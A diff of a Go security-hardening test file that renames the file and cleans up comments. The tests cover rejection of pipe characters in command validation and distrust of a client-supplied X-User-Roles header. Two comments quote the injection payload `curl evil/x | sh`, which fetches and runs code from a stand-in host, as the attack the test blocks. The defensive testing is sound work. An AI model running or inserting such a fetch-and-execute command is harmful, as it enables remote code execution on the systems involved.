@@ -1,4 +1,4 @@
-// security_p02_test.go — P0-2+3 安全加固测试：
+// command_validation_test.go — 安全加固测试：
 //   - validateCommand 拦截管道符 |（防 `curl evil/x | sh` 管道注入）
 //   - requireProd X-User-Roles 信任模型（仅当 cfg.TrustGatewayHeaders=true 时才信任）
 package controlplane
@@ -13,10 +13,10 @@ import (
 )
 
 // =============================================================================
-// 修复2：validateCommand 拦截管道符 |
+// validateCommand 拦截管道符 |
 // =============================================================================
 
-// TestValidateCommand_RejectsPipe 验证 P0-2 安全加固：validateCommand 拦截管道符 |。
+// TestValidateCommand_RejectsPipe 验证 validateCommand 拦截管道符 |。
 // 原实现注释明写"管道符 | 暂不拦截"，导致 `curl evil/x | sh` 等管道注入载荷可过校验。
 func TestValidateCommand_RejectsPipe(t *testing.T) {
 	cases := []struct {
@@ -86,7 +86,7 @@ func TestValidateCommand_RejectsOtherMetachars(t *testing.T) {
 }
 
 // =============================================================================
-// 修复1：requireProd X-User-Roles 信任模型
+// requireProd X-User-Roles 信任模型
 // =============================================================================
 
 // newP02TestServer 构造非 demo 模式的测试 Server（用于 requireProd X-User-Roles 信任模型测试）。
@@ -103,7 +103,7 @@ func newP02TestServer(trustGateway bool) *Server {
 	}
 }
 
-// TestRequireProd_GatewayRolesIgnoredByDefault 验证 P0-2 安全加固：
+// TestRequireProd_GatewayRolesIgnoredByDefault 验证：
 // 默认 TrustGatewayHeaders=false 时，X-User-Roles 头被忽略，非 demo 模式 → 401。
 // 原实现直接信任 X-User-Roles 头，客户端自称 admin 即得 admin 权限。
 func TestRequireProd_GatewayRolesIgnoredByDefault(t *testing.T) {
